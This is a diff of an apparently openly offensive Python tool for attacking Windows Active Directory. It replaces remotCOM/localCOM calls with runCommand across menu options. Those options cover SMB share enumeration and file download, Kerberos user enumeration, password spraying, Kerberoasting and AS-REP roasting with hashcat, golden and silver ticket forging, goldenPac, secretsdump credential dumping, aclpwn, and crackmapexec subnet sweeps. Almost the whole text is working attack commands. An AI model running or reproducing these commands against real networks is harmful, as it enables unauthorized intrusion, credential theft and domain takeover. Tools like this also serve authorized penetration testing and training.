+               runCommand(keyPath + "rpcmap.py -debug -auth-transport " + DOM.rstrip(" ") + "/" + USR.rstrip(" ") + ":" + PAS.rstrip(" ") + " -auth-rpc " + DOM.rstrip(" ") + "/" + USR.rstrip(" ") + ":" + PAS.rstrip(" ") + " -auth-level 6 -brute-opnums " + stringBindings)
       prompt()
       
 # ------------------------------------------------------------------------------------- 
@@ -2184,10 +2142,10 @@ while True:
          checkParams = test_DOM()                     
       if checkParams != 1:
          if NTM[:5] == "EMPTY":
-            remotCOM("rpcclient -U " + DOM.rstrip(" ") + "/" + USR.rstrip(" ") + "%" + PAS.rstrip(" ") + " " + TIP.rstrip(" "))
+            runCommand("rpcclient -U " + DOM.rstrip(" ") + "/" + USR.rstrip(" ") + "%" + PAS.rstrip(" ") + " " + TIP.rstrip(" "))
          else:
             print("[i] Using HASH value as password login credential...\n")
-            remotCOM("rpcclient -U " + DOM.rstrip(" ") + "/" + USR.rstrip(" ") + "%" + NTM.rstrip(" ") + " --pw-nt-hash " + TIP.rstrip(" ")) 
+            runCommand("rpcclient -U " + DOM.rstrip(" ") + "/" + USR.rstrip(" ") + "%" + NTM.rstrip(" ") + " --pw-nt-hash " + TIP.rstrip(" ")) 
       prompt()
 
 # ------------------------------------------------------------------------------------- 
@@ -2204,25 +2162,25 @@ while True:
          print(colored("[*] Finding shares, please wait...", colour3))
          if NTM[:5] != "EMPTY":
             print("[i] Using HASH value as password credential...")
-            remotCOM("smbmap -H " + TIP.rstrip(" ") + " -u " + USR.rstrip(" ") + "%:" + NTM.rstrip(" ") + " > shares1.tmp")
-            remotCOM("smbclient -L \\\\\\\\" + TIP.rstrip(" ") + " -U " + USR.rstrip(" ") + "%" + NTM.rstrip(" ") + " --pw-nt-hash > shares2.tmp")
+            runCommand("smbmap -H " + TIP.rstrip(" ") + " -u " + USR.rstrip(" ") + "%:" + NTM.rstrip(" ") + " > shares1.tmp")
+            runCommand("smbclient -L \\\\\\\\" + TIP.rstrip(" ") + " -U " + USR.rstrip(" ") + "%" + NTM.rstrip(" ") + " --pw-nt-hash > shares2.tmp")
             if not os.path.exists("shares2.tmp2"):
                if PAS.rstrip(" ") == "''":
                   print("[!] Requires password, please press ENTER...")
-                  remotCOM("smbclient -L \\\\\\\\" + TIP.rstrip(" ") + " -U " + USR.rstrip(" ") + " -p " + NTM.rstrip(" ") + " --pw-nt-hash > shares2.tmp")               
+                  runCommand("smbclient -L \\\\\\\\" + TIP.rstrip(" ") + " -U " + USR.rstrip(" ") + " -p " + NTM.rstrip(" ") + " --pw-nt-hash > shares2.tmp")               
          else:
-            remotCOM("smbmap -H " + TIP.rstrip(" ") + " -u " + USR.rstrip(" ") + "%" + PAS.rstrip(" ") + " > shares1.tmp")
+            runCommand("smbmap -H " + TIP.rstrip(" ") + " -u " + USR.rstrip(" ") + "%" + PAS.rstrip(" ") + " > shares1.tmp")
             catsFile("shares1.tmp")                       
-            remotCOM("smbclient -L \\\\\\\\" + TIP.rstrip(" ") + " -U " + USR.rstrip(" ") + "%" + PAS.rstrip(" ") + " > shares2.tmp")
+            runCommand("smbclient -L \\\\\\\\" + TIP.rstrip(" ") + " -U " + USR.rstrip(" ") + "%" + PAS.rstrip(" ") + " > shares2.tmp")
             if not os.path.exists("shares2.tmp2"):
                if PAS.rstrip(" ") == "''":
                   print("[!] Requires password, please press ENTER...")
-                  remotCOM("smbclient -L \\\\\\\\" + TIP.rstrip(" ") + " -U " + USR.rstrip(" ") + " -p " + PAS.rstrip(" ") + " > shares2.tmp")
+                  runCommand("smbclient -L \\\\\\\\" + TIP.rstrip(" ") + " -U " + USR.rstrip(" ") + " -p " + PAS.rstrip(" ") + " > shares2.tmp")
          cutLine("Enter WORKGROUP", "shares2.tmp")
          bonusCheck = linecache.getline("shares2.tmp", 1)
          if "session setup failed: NT_STATUS_PASSWORD_MUS" in bonusCheck:
             print(colored("[!] Bonus!! It looks like we can change this users password...", colour0))
-            remotCOM("smbpasswd -r " + TIP.rstrip(" ") + " -U " + USR.rstrip(" "))                                    
+            runCommand("smbpasswd -r " + TIP.rstrip(" ") + " -U " + USR.rstrip(" "))                                    
          if os.path.getsize("shares2.tmp") != 0: 
             catsFile("shares2.tmp")           
             cutLine("is an IPv6 address","shares2.tmp")
@@ -2235,8 +2193,8 @@ while True:
             cutLine("Sharename","shares2.tmp")
             cutLine("---------","shares2.tmp")
             cutLine("^$","shares2.tmp")
-            localCOM("sed -i 's/^[ \t]*//' shares2.tmp")
-            localCOM("mv shares2.tmp " + dataDir + "/shares.txt")
+            runCommand("sed -i 's/^[ \t]*//' shares2.tmp")
+            runCommand("mv shares2.tmp " + dataDir + "/shares.txt")
          with open(dataDir + "/shares.txt", "r") as shares:
             for x in range(0, maxUser):
                 SHAR[x] = shares.readline().rstrip(" ")
@@ -2244,7 +2202,7 @@ while True:
          with open("shares1.tmp","r") as check:
             if "READ, WRITE" in check.read():
                print(colored("[*] A remote SMB READ/WRITE directory has been identified, checking for possible CVE-2017-7494 exploit - please wait...\n", colour3))
-               remotCOM("nmap --script smb-vuln-cve-2017-7494 --script-args smb-vuln-cve-2017-7494.check-version -p445 " + TIP.rstrip(" ") + " > exploit.tmp")
+               runCommand("nmap --script smb-vuln-cve-2017-7494 --script-args smb-vuln-cve-2017-7494.check-version -p445 " + TIP.rstrip(" ") + " > exploit.tmp")
                cutLine("Starting Nmap", "exploit.tmp")
                cutLine("Nmap scan report", "exploit.tmp")
                cutLine("Host is up", "exploit.tmp")
@@ -2276,18 +2234,18 @@ while True:
          if NTM[:5] != "EMPTY":
             print("[i] Using HASH value as password credential...")
             print(colored("[*] Checking OS...", colour3))
-            remotCOM("smbmap -v --admin -u " + USR.rstrip(" ") + "%:'" + NTM.rstrip(" ") + "' -d " + DOM.rstrip(" ") + " -H " + TIP.rstrip(" ") + " -R " + TSH.rstrip(" "))      
+            runCommand("smbmap -v --admin -u " + USR.rstrip(" ") + "%:'" + NTM.rstrip(" ") + "' -d " + DOM.rstrip(" ") + " -H " + TIP.rstrip(" ") + " -R " + TSH.rstrip(" "))      
             print(colored("[*] Checking command privilege...", colour3))
-            remotCOM("smbmap -x whoami -u " + USR.rstrip(" ") + "%:'" + NTM.rstrip(" ") + "' -d " + DOM.rstrip(" ") + " -H " + TIP.rstrip(" ") + " -R " + TSH.rstrip(" "))      
+            runCommand("smbmap -x whoami -u " + USR.rstrip(" ") + "%:'" + NTM.rstrip(" ") + "' -d " + DOM.rstrip(" ") + " -H " + TIP.rstrip(" ") + " -R " + TSH.rstrip(" "))      
             print(colored("[*] Mapping Shares...", colour3))
-            remotCOM("smbmap -u " + USR.rstrip(" ") + "%:'" + NTM.rstrip(" ") + "' -d " + DOM.rstrip(" ") + " -H " + TIP.rstrip(" ")  + " -R " + TSH.rstrip(" ") + " --depth 15")      
+            runCommand("smbmap -u " + USR.rstrip(" ") + "%:'" + NTM.rstrip(" ") + "' -d " + DOM.rstrip(" ") + " -H " + TIP.rstrip(" ")  + " -R " + TSH.rstrip(" ") + " --depth 15")      
          else:
             print(colored("[*] Checking OS...", colour3))
-            remotCOM("smbmap -v --admin -u " + USR.rstrip(" ") + "%'" + PAS.rstrip(" ") + "' -d " + DOM.rstrip(" ") + " -H " + TIP.rstrip(" ") + " -R " + TSH.rstrip(" "))
+            runCommand("smbmap -v --admin -u " + USR.rstrip(" ") + "%'" + PAS.rstrip(" ") + "' -d " + DOM.rstrip(" ") + " -H " + TIP.rstrip(" ") + " -R " + TSH.rstrip(" "))
             print(colored("[*] Checking command privilege...", colour3))
-            remotCOM("smbmap -x whoami -u " + USR.rstrip(" ") + "%'" + PAS.rstrip(" ") + "' -d " + DOM.rstrip(" ") + " -H " + TIP.rstrip(" ") + " -R " + TSH.rstrip(" "))         
+            runCommand("smbmap -x whoami -u " + USR.rstrip(" ") + "%'" + PAS.rstrip(" ") + "' -d " + DOM.rstrip(" ") + " -H " + TIP.rstrip(" ") + " -R " + TSH.rstrip(" "))         
             print(colored("[*] Mapping Shares...", colour3))
-            remotCOM("smbmap -u " + USR.rstrip(" ") + "%'" + PAS.rstrip(" ") + "' -d " + DOM.rstrip(" ") + " -H " + TIP.rstrip(" ")  + " -R " + TSH.rstrip(" ") + " --depth 15 > mapped.tmp")            
+            runCommand("smbmap -u " + USR.rstrip(" ") + "%'" + PAS.rstrip(" ") + "' -d " + DOM.rstrip(" ") + " -H " + TIP.rstrip(" ")  + " -R " + TSH.rstrip(" ") + " --depth 15 > mapped.tmp")            
             cutLine("[+]","mapped.tmp")
             parsFile("mapped.tmp")
             catsFile("mapped.tmp")
@@ -2317,10 +2275,10 @@ while True:
          if NTM[:5] != "EMPTY":
             print("[i] Using HASH value as password credential...")
             print("[+] Downloading any found files...")
-            remotCOM("smbmap -u " + USR.rstrip(" ") + "%:'" + NTM.rstrip(" ") + "' -d " + DOM.rstrip(" ") + " -H " + TIP.rstrip(" ") + " -A " + exTensions + " -R " + TSH.rstrip(" ") + " --depth 15")
+            runCommand("smbmap -u " + USR.rstrip(" ") + "%:'" + NTM.rstrip(" ") + "' -d " + DOM.rstrip(" ") + " -H " + TIP.rstrip(" ") + " -A " + exTensions + " -R " + TSH.rstrip(" ") + " --depth 15")
          else:
             print("[+] Downloading any found files...")
-            remotCOM("smbmap -u " + USR.rstrip(" ") + "%'" + PAS.rstrip(" ") + "' -d " + DOM.rstrip(" ") + " -H " + TIP.rstrip(" ") + " -A " + exTensions + " -R " + TSH.rstrip(" ") + " --depth 15") 
+            runCommand("smbmap -u " + USR.rstrip(" ") + "%'" + PAS.rstrip(" ") + "' -d " + DOM.rstrip(" ") + " -H " + TIP.rstrip(" ") + " -A " + exTensions + " -R " + TSH.rstrip(" ") + " --depth 15") 
       prompt()
 
 # ------------------------------------------------------------------------------------- 
@@ -2338,9 +2296,9 @@ while True:
       if checkParams != 1:
          if NTM[:5] != "EMPTY":
             print("[i] Using HASH value as password credential...")
-            remotCOM("smbclient \\\\\\\\" + TIP.rstrip(" ") + "\\\\" + TSH.rstrip(" ") + " -U " + USR.rstrip(" ") + "%:'" + NTM.rstrip(" ") + "' --pw-nt-hash -s " + TSH.rstrip(" " ))
+            runCommand("smbclient \\\\\\\\" + TIP.rstrip(" ") + "\\\\" + TSH.rstrip(" ") + " -U " + USR.rstrip(" ") + "%:'" + NTM.rstrip(" ") + "' --pw-nt-hash -s " + TSH.rstrip(" " ))
          else:
-            remotCOM("smbclient \\\\\\\\" + TIP.rstrip(" ") + "\\\\" + TSH.rstrip(" ") + " -U " + USR.rstrip(" ") + "%'" + PAS.rstrip(" ") + "' -s " + TSH.rstrip(" "))
+            runCommand("smbclient \\\\\\\\" + TIP.rstrip(" ") + "\\\\" + TSH.rstrip(" ") + " -U " + USR.rstrip(" ") + "%'" + PAS.rstrip(" ") + "' -s " + TSH.rstrip(" "))
       prompt()
    
 # ------------------------------------------------------------------------------------- 
@@ -2358,9 +2316,9 @@ while True:
       if checkParams != 1:
          if NTM[:5] != "EMPTY":
             print("[i] Using HASH value as password credential...")
-            remotCOM(keyPath + "GetADUsers.py -all " + DOM.rstrip(" ") + "/" + USR.rstrip(" ") + " -hashes :" + NTM.rstrip(" ") +" -dc-ip "  + TIP.rstrip(" "))
+            runCommand(keyPath + "GetADUsers.py -all " + DOM.rstrip(" ") + "/" + USR.rstrip(" ") + " -hashes :" + NTM.rstrip(" ") +" -dc-ip "  + TIP.rstrip(" "))
          else:
-            remotCOM(keyPath + "GetADUsers.py -all " + DOM.rstrip(" ") + "/" + USR.rstrip(" ") + ":" + PAS.rstrip(" ") +" -dc-ip "  + TIP.rstrip(" "))
+            runCommand(keyPath + "GetADUsers.py -all " + DOM.rstrip(" ") + "/" + USR.rstrip(" ") + ":" + PAS.rstrip(" ") +" -dc-ip "  + TIP.rstrip(" "))
       prompt()
 
 # ------------------------------------------------------------------------------------- 
@@ -2379,9 +2337,9 @@ while True:
          checkParams = test_PRT("88")               
       if checkParams != 1:
          print(colored("[*] Enumerating remote server for valid usernames, please wait...", colour3))
-         remotCOM("nmap " + IP46 + " -p 88 --script=krb5-enum-users --script-args=krb5-enum-users.realm=\'" + DOM.rstrip(" ") + ", userdb=" + dataDir + "/usernames.txt\' " + TIP.rstrip(" ") + " >> users.tmp")
-         localCOM("sed -i '/@/!d' users.tmp")							# PARSE FILE 1
-         localCOM("sort -r users.tmp > sortedusers.tmp")                  
+         runCommand("nmap " + IP46 + " -p 88 --script=krb5-enum-users --script-args=krb5-enum-users.realm=\'" + DOM.rstrip(" ") + ", userdb=" + dataDir + "/usernames.txt\' " + TIP.rstrip(" ") + " >> users.tmp")
+         runCommand("sed -i '/@/!d' users.tmp")							# PARSE FILE 1
+         runCommand("sort -r users.tmp > sortedusers.tmp")                  
          with open("sortedusers.tmp", "r") as read, open("validusers.tmp", "w") as parse:	# PARSE FILE 2
             for username in read:
                username = username.replace("|     ","")
@@ -2432,7 +2390,7 @@ while True:
          checkParams = test_DOM()
       if checkParams != 1:
          print(colored("[*] Trying all usernames with password " + PAS.rstrip(" ") + " first...", colour3))
-         remotCOM("kerbrute -dc-ip " + TIP.rstrip(" ") + " -domain " + DOM.rstrip(" ") + " -users " + dataDir + "/usernames.txt -password '" + PAS.rstrip(" ") + "' -outputfile password1.tmp")
+         runCommand("kerbrute -dc-ip " + TIP.rstrip(" ") + " -domain " + DOM.rstrip(" ") + " -users " + dataDir + "/usernames.txt -password '" + PAS.rstrip(" ") + "' -outputfile password1.tmp")
          test1 = linecache.getline("password1.tmp", 1)               
          if test1 != "":
             found = 1
@@ -2442,7 +2400,7 @@ while True:
             TGT = privCheck()                         
          if found == 0:
             print(colored("\n[*] Now trying all usernames with matching passwords...",colour3))
-            remotCOM("kerbrute -dc-ip " + TIP.rstrip(" ") + " -domain " + DOM.rstrip(" ") + " -users " + dataDir + "/usernames.txt -passwords " + dataDir + "/usernames.txt -outputfile password2.tmp")
+            runCommand("kerbrute -dc-ip " + TIP.rstrip(" ") + " -domain " + DOM.rstrip(" ") + " -users " + dataDir + "/usernames.txt -passwords " + dataDir + "/usernames.txt -outputfile password2.tmp")
             test2 = linecache.getline("password2.tmp", 1)                        
             if test2 != "":
                found = 1
@@ -2452,7 +2410,7 @@ while True:
                TGT = privCheck()                              
          if found == 0:
             print(colored("\n[*] Now trying all users against password list, please wait as this could take sometime...",colour3))            
-            remotCOM("kerbrute -dc-ip " + TIP.rstrip(" ") + " -domain " + DOM.rstrip(" ") + " -users " + dataDir + "/usernames.txt -passwords " + dataDir + "/passwords.txt -outputfile password3.tmp")                 
+            runCommand("kerbrute -dc-ip " + TIP.rstrip(" ") + " -domain " + DOM.rstrip(" ") + " -users " + dataDir + "/usernames.txt -passwords " + dataDir + "/passwords.txt -outputfile password3.tmp")                 
             test3 = linecache.getline("password3.tmp", 1)                       
             if test3 != "":
                USR,PAS = test3.split(":") 
@@ -2476,12 +2434,12 @@ while True:
       if checkParams != 1:
          if NTM[:5] != "EMPTY":
             print("[i] Using HASH value as password credential...")
-            remotCOM(keyPath + "GetUserSPNs.py " + DOM.rstrip(" ") + "/" + USR.rstrip(" ") + " -hashes :" + NTM.rstrip(" ") +" -outputfile hashroast1.tmp")
+            runCommand(keyPath + "GetUserSPNs.py " + DOM.rstrip(" ") + "/" + USR.rstrip(" ") + " -hashes :" + NTM.rstrip(" ") +" -outputfile hashroast1.tmp")
          else:
-            remotCOM(keyPath + "GetUserSPNs.py " + DOM.rstrip(" ") + "/" + USR.rstrip(" ") + ":" + PAS.rstrip(" ") +" -outputfile hashroast1.tmp")                          
+            runCommand(keyPath + "GetUserSPNs.py " + DOM.rstrip(" ") + "/" + USR.rstrip(" ") + ":" + PAS.rstrip(" ") +" -outputfile hashroast1.tmp")                          
          print(colored("[*] Cracking hash values if they exists...\n", colour3))
-         localCOM("hashcat -m 13100 --force -a 0 hashroast1.tmp /usr/share/wordlists/rockyou.txt -o cracked1.txt")
-         localCOM("strings cracked1.txt")
+         runCommand("hashcat -m 13100 --force -a 0 hashroast1.tmp /usr/share/wordlists/rockyou.txt -o cracked1.txt")
+         runCommand("strings cracked1.txt")
       else:
          print("[+] The file usernames.txt is empty...")         
       prompt()
@@ -2499,29 +2457,29 @@ while True:
       if checkParams != 1:
          checkParams = test_DOM()          
       if checkParams != 1:      
-         localCOM("touch authorised.tmp")         
+         runCommand("touch authorised.tmp")         
          with open(dataDir + "/usernames.txt", "r") as read:
             for x in range(0, maxUser):
                line = read.readline().rstrip("\n")
                if VALD[x] == "1":
-                  localCOM("echo " + line + " >> authorised.tmp")                        
+                  runCommand("echo " + line + " >> authorised.tmp")                        
          count = lineCount("authorised.tmp")                       
          if count > 0:           
             with open(dataDir + "/usernames.txt", "r") as read:
                for x in range(0, maxUser):
                   line = read.readline().rstrip("\n")
-                  localCOM("echo " + line + " >> authorised.tmp")      
+                  runCommand("echo " + line + " >> authorised.tmp")      
          else:
             print("[+] The authorised user file seems to be empty, so I am authorising everyone in the list..")                     
          if checkParams != 1:
             if NTM[:5] != "EMPTY":
                print("[i] Using HASH value as password credential...")
-               remotCOM(keyPath + "GetNPUsers.py -outputfile hashroast2.tmp -format hashcat " + DOM.rstrip(" ") + "/ -usersfile authorised.tmp")
+               runCommand(keyPath + "GetNPUsers.py -outputfile hashroast2.tmp -format hashcat " + DOM.rstrip(" ") + "/ -usersfile authorised.tmp")
             else:
-               remotCOM(keyPath + "GetNPUsers.py -outputfile hashroast2.tmp -format hashcat " + DOM.rstrip(" ") + "/ -usersfile authorised.tmp")                        
+               runCommand(keyPath + "GetNPUsers.py -outputfile hashroast2.tmp -format hashcat " + DOM.rstrip(" ") + "/ -usersfile authorised.tmp")                        
             print(colored("[*] Cracking hash values if they exists...\n", colour3))
-            localCOM("hashcat -m 18200 --force -a 0 hashroast2.tmp /usr/share/wordlists/rockyou.txt -o cracked2.txt")
-            localCOM("strings cracked2.txt")         
+            runCommand("hashcat -m 18200 --force -a 0 hashroast2.tmp /usr/share/wordlists/rockyou.txt -o cracked2.txt")
+            runCommand("strings cracked2.txt")         
       prompt()
 
 # ------------------------------------------------------------------------------------- 
@@ -2578,10 +2536,10 @@ while True:
             with open(dataDir + "/hashes.txt", "r") as force:
                for brute in force:
                   brute = brute.rstrip("\n")                               
-                  remotCOM(keyPath + "getTGT.py " + DOM.rstrip(" ") +  "/" + USR.rstrip(" ") + " -hashes :" + brute + " -dc-ip " + TIP.rstrip(" ") + " > datalog.tmp")
+                  runCommand(keyPath + "getTGT.py " + DOM.rstrip(" ") +  "/" + USR.rstrip(" ") + " -hashes :" + brute + " -dc-ip " + TIP.rstrip(" ") + " > datalog.tmp")
                   counter = counter + 1
-                  localCOM("sed -i '1d' datalog.tmp")
-                  localCOM("sed -i '1d' datalog.tmp")                                 
+                  runCommand("sed -i '1d' datalog.tmp")
+                  runCommand("sed -i '1d' datalog.tmp")                                 
                   with open("datalog.tmp", "r") as ticket:
                      checkFile = ticket.read()                                           
                   if "[*] Saving ticket" in checkFile:
@@ -2620,7 +2578,7 @@ while True:
          print(colored("[*] Trying to create TGT for user " + USR.rstrip(" ") + "...", colour3))                  
          if (NTM[:1] != ""):
             print("[i] Using HASH value as password credential...")
-            remotCOM(keyPath + "getTGT.py " + DOM.rstrip(" ") + "/" + USR.rstrip(" ") + " -hashes :" + NTM.rstrip(" "))                        
+            runCommand(keyPath + "getTGT.py " + DOM.rstrip(" ") + "/" + USR.rstrip(" ") + " -hashes :" + NTM.rstrip(" "))                        
             if os.path.exists(USR.rstrip(" ") + ".ccache"):
                print("[+] Checking TGT status...")
                TGT = privCheck()
@@ -2645,17 +2603,17 @@ while True:
       if checkParams != 1:
          krb5 = input("[?] Please enter default realm :")
          print(colored("[*] Attempting to create kerberus ticket for user " + USR.rstrip(" ") + "@" + krb5.rstrip("\n") + "...", colour3))
-         localCOM("mv /etc/krb5.conf /etc/krb5.conf.bak")
-         localCOM("echo '[libdefaults]' > /etc/krb5.conf")
-         localCOM("echo '	default_realm = " + krb5.rstrip("\n") + "' >> /etc/krb5.conf")
-         localCOM("echo '[realms]' >> /etc/krb5.conf")
-         localCOM("echo '\t\t" + krb5.rstrip("\n") + " = {' >> /etc/krb5.conf")
-         localCOM("echo '\t\t\tkdc = " + TIP.rstrip(" ") + "' >> /etc/krb5.conf")
-         localCOM("echo '\t\t\t}' >> /etc/krb5.conf\n")
-         localCOM("kinit " + USR.rstrip(" "))
-         localCOM("klist")
-         localCOM("rm /etc/krb5.conf")
-         localCOM("mv /etc/krb5.conf.bak /etc/krb5.conf")
+         runCommand("mv /etc/krb5.conf /etc/krb5.conf.bak")
+         runCommand("echo '[libdefaults]' > /etc/krb5.conf")
+         runCommand("echo '	default_realm = " + krb5.rstrip("\n") + "' >> /etc/krb5.conf")
+         runCommand("echo '[realms]' >> /etc/krb5.conf")
+         runCommand("echo '\t\t" + krb5.rstrip("\n") + " = {' >> /etc/krb5.conf")
+         runCommand("echo '\t\t\tkdc = " + TIP.rstrip(" ") + "' >> /etc/krb5.conf")
+         runCommand("echo '\t\t\t}' >> /etc/krb5.conf\n")
+         runCommand("kinit " + USR.rstrip(" "))
+         runCommand("klist")
+         runCommand("rm /etc/krb5.conf")
+         runCommand("mv /etc/krb5.conf.bak /etc/krb5.conf")
       prompt()
 
 # ------------------------------------------------------------------------------------- 
@@ -2677,7 +2635,7 @@ while True:
          print(colored("[*] Trying to create silver TGT for user " + USR.rstrip(" ") + "...", colour3))                  
          if (NTM[:1] != "") & (SID[:1] != ""):
             print("[i] Using HASH value as password credential...")
-            remotCOM(keyPath + "ticketer.py -nthash :" + NTM.rstrip("\n") + " -domain-sid " + SID.rstrip("\n") + " -domain " + DOM.rstrip(" ") + " -spn CIFS/DESKTOP-01." + DOM.rstrip(" ") + " " + USR.rstrip(" "))            
+            runCommand(keyPath + "ticketer.py -nthash :" + NTM.rstrip("\n") + " -domain-sid " + SID.rstrip("\n") + " -domain " + DOM.rstrip(" ") + " -spn CIFS/DESKTOP-01." + DOM.rstrip(" ") + " " + USR.rstrip(" "))            
          if os.path.exists(USR.rstrip(" ") + ".ccache"):
             print("[+] Checking silver TGT status...")
             TGT = privCheck()
@@ -2705,7 +2663,7 @@ while True:
          
          if (NTM[:1] != "") & (SID[:1] != ""):
             print("[i] Using HASH value as password credential...")
-            remotCOM(keyPath + "ticketer.py -nthash :" + NTM.rstrip("\n") + " -domain-sid " + SID.rstrip("\n") + " -domain " + DOM.rstrip(" ") + " " + USR.rstrip(" "))                        
+            runCommand(keyPath + "ticketer.py -nthash :" + NTM.rstrip("\n") + " -domain-sid " + SID.rstrip("\n") + " -domain " + DOM.rstrip(" ") + " " + USR.rstrip(" "))                        
          if os.path.exists(USR.rstrip(" ") + ".ccache"):
             print("[+] Checking gold TGT status...")
             TGT = privCheck()
@@ -2728,11 +2686,11 @@ while True:
       if checkParams != 1:
          if NTM[:5] != "EMPTY":
             print("[i] Using HASH value as password credential...")
-            remotCOM("ldapdomaindump -u '" + DOM.rstrip(" ") + '\\' + USR.rstrip(" ") + "' -p :" + NTM.rstrip(" ") +" " + TIP.rstrip(" ") + " -o " + workDir)
+            runCommand("ldapdomaindump -u '" + DOM.rstrip(" ") + '\\' + USR.rstrip(" ") + "' -p :" + NTM.rstrip(" ") +" " + TIP.rstrip(" ") + " -o " + workDir)
          else:
-            remotCOM("ldapdomaindump -u '" + DOM.rstrip(" ") + '\\' + USR.rstrip(" ") + "' -p '" + PAS.rstrip(" ") +"' " + TIP.rstrip(" ") + " -o " + workDir)                     
+            runCommand("ldapdomaindump -u '" + DOM.rstrip(" ") + '\\' + USR.rstrip(" ") + "' -p '" + PAS.rstrip(" ") +"' " + TIP.rstrip(" ") + " -o " + workDir)                     
          print(colored("[*] Checking downloaded files...\n", colour3))
-         localCOM("ls -la ./" + workDir + "/*.*")
+         runCommand("ls -la ./" + workDir + "/*.*")
       prompt()
       
 # ------------------------------------------------------------------------------------- 
@@ -2750,9 +2708,9 @@ while True:
       if checkParams != 1:
          if NTM[:5] != "EMPTY":
             print("[i] Using HASH value as password credential...")
-            remotCOM(keyPath + "goldenPac.py -dc-ip " + TIP.rstrip(" ") + " -target-ip " + TIP.rstrip(" ") + " " + DOM.rstrip(" ") + "/" + USR.rstrip(" ") + "@" + DOM.rstrip(" ") + " -hashes :" + NTM.rstrip(" "))
+            runCommand(keyPath + "goldenPac.py -dc-ip " + TIP.rstrip(" ") + " -target-ip " + TIP.rstrip(" ") + " " + DOM.rstrip(" ") + "/" + USR.rstrip(" ") + "@" + DOM.rstrip(" ") + " -hashes :" + NTM.rstrip(" "))
          else:
-            remotCOM(keyPath + "goldenPac.py -dc-ip " + TIP.rstrip(" ") + " -target-ip " + TIP.rstrip(" ") + " " + DOM.rstrip(" ") + "/" + USR.rstrip(" ") + ":" + PAS.rstrip(" ") +"@" + DOM.rstrip(" "))
+            runCommand(keyPath + "goldenPac.py -dc-ip " + TIP.rstrip(" ") + " -target-ip " + TIP.rstrip(" ") + " " + DOM.rstrip(" ") + "/" + USR.rstrip(" ") + ":" + PAS.rstrip(" ") +"@" + DOM.rstrip(" "))
       prompt()      
       
 # ------------------------------------------------------------------------------------- 
@@ -2770,16 +2728,16 @@ while True:
       if checkParams != 1:
          print ("[*] Enumerating, please wait...\n")                       
          if PAS[:2] != "''":
-            remotCOM("bloodhound-python -d " + DOM.rstrip(" ") + " -u " + USR.rstrip(" ") + " -p '" + PAS.rstrip(" ") + "' -c all -ns " + TIP.rstrip(" "))
+            runCommand("bloodhound-python -d " + DOM.rstrip(" ") + " -u " + USR.rstrip(" ") + " -p '" + PAS.rstrip(" ") + "' -c all -ns " + TIP.rstrip(" "))
          else:
             if NTM[:5].upper() != "EMPTY":
                print("[i] Using HASH value as password credential...")
-               remotCOM("bloodhound-python -d " + DOM.rstrip(" ") + " -u " + USR.rstrip(" ") + " --hashes " + NTM.rstrip(" ") + " -c all -ns " + TIP.rstrip(" "))            
+               runCommand("bloodhound-python -d " + DOM.rstrip(" ") + " -u " + USR.rstrip(" ") + " --hashes " + NTM.rstrip(" ") + " -c all -ns " + TIP.rstrip(" "))            
             else:
                print("[-] Both, password and ntlm hash values are invalid...")
       print("\n[*] Checking downloaded files...\n")
-      localCOM("mv *.json ./" + workDir)
-      localCOM("ls -la ./" + workDir + "/*.*")            
+      runCommand("mv *.json ./" + workDir)
+      runCommand("ls -la ./" + workDir + "/*.*")            
       prompt()
          
 # ------------------------------------------------------------------------------------- 
@@ -2798,7 +2756,7 @@ while True:
          BH1 = input("[+] Enter Neo4j username: ")
          BH2 = input("[+] Enter Neo4j password: ")                  
          if BH1 != "" and BH2 != "":
-            remotCOM("aclpwn -du " + BH1 + " -dp " + BH2 + " -f " + USR.rstrip(" ") + "@" + DOM.rstrip(" ") + " -d " + DOM.rstrip(" ") + " -sp " + PAS.rstrip(" ") + " -s " + TIP.rstrip(" "))
+            runCommand("aclpwn -du " + BH1 + " -dp " + BH2 + " -f " + USR.rstrip(" ") + "@" + DOM.rstrip(" ") + " -d " + DOM.rstrip(" ") + " -sp " + PAS.rstrip(" ") + " -s " + TIP.rstrip(" "))
          else:
             print("[+] Username or password cannot be null...")            
       prompt()
@@ -2818,16 +2776,16 @@ while True:
       if checkParams != 1:
          print(colored("[*] Enumerating, please wait...", colour3))         
          if PAS[:2] != "''":
-            remotCOM(keyPath + "secretsdump.py '" + DOM.rstrip(" ") + "/" + USR.rstrip(" ") + ":" + PAS.rstrip(" ") + "@" + TIP.rstrip(" ") + "' > secrets.tmp")
+            runCommand(keyPath + "secretsdump.py '" + DOM.rstrip(" ") + "/" + USR.rstrip(" ") + ":" + PAS.rstrip(" ") + "@" + TIP.rstrip(" ") + "' > secrets.tmp")
          else:
             print("[i] Using HASH value as password credential...")
-            remotCOM(keyPath + "secretsdump.py '" + DOM.rstrip(" ") + "/" + USR.rstrip(" ") + "@" + TIP.rstrip(" ") + "' -hashes ':" + NTM.rstrip(" ") + "' > secrets.tmp")                        
-         localCOM("sed -i '/:::/!d' secrets.tmp")
-         localCOM("sort -u secrets.tmp > ssecrets.tmp")         
+            runCommand(keyPath + "secretsdump.py '" + DOM.rstrip(" ") + "/" + USR.rstrip(" ") + "@" + TIP.rstrip(" ") + "' -hashes ':" + NTM.rstrip(" ") + "' > secrets.tmp")                        
+         runCommand("sed -i '/:::/!d' secrets.tmp")
+         runCommand("sort -u secrets.tmp > ssecrets.tmp")         
          count = lineCount("ssecrets.tmp")               	
          if count > 0:               
-            localCOM("rm " + dataDir + "/usernames.txt")
-            localCOM("rm " + dataDir + "/hashes.txt")
+            runCommand("rm " + dataDir + "/usernames.txt")
+            runCommand("rm " + dataDir + "/hashes.txt")
             wipeTokens(VALD)             
             for x in range(0, count):
                data = linecache.getline("ssecrets.tmp", x + 1)               
@@ -2854,8 +2812,8 @@ while True:
                USER[x] = spacePadding(USER[x], COL3)
                HASH[x] = spacePadding(HASH[x], COL4)               
                if USER[x][:1] != " ":
-                  localCOM("echo " + USER[x].rstrip(" ") + " >> " + dataDir + "/usernames.txt")
-                  localCOM("echo " + HASH[x].rstrip(" ") + " >> " + dataDir + "/hashes.txt")           
+                  runCommand("echo " + USER[x].rstrip(" ") + " >> " + dataDir + "/usernames.txt")
+                  runCommand("echo " + HASH[x].rstrip(" ") + " >> " + dataDir + "/hashes.txt")           
          else:      
             print("[+] No users were found. check the domain name is correct...")               
       prompt()
@@ -2877,41 +2835,41 @@ while True:
             checkParams = test_PRT("5985")                                    
             if checkParams != 1:
                print("[+] Finding exploitable machines on the same subnet...\n")
-               remotCOM("crackmapexec winrm " + TIP.rstrip(" ") + "/24")                         
+               runCommand("crackmapexec winrm " + TIP.rstrip(" ") + "/24")                         
             checkParams = test_PRT("445")
             if checkParams != 1:
